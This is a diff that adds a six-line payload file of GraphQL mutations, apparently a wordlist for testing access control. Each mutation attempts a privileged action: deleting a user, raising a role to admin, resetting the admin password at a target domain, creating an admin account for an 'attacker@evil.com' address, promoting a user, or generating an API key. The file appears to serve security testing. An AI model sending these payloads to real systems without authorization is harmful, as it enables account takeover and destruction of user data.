@@ -1,0 +1,6 @@
+{"query":"mutation { deleteUser(id: 1) { success } }"}
+{"query":"mutation { updateUserRole(id: 1, role: \"admin\") { id role } }"}
+{"query":"mutation { resetPassword(email: \"admin@target.com\") { success } }"}
+{"query":"mutation { createUser(email: \"attacker@evil.com\", role: \"admin\", password: \"hack\") { id token } }"}
+{"query":"mutation { promoteUser(id: 1) { id role } }"}
+{"query":"mutation { generateApiKey(userId: 1) { key } }"}
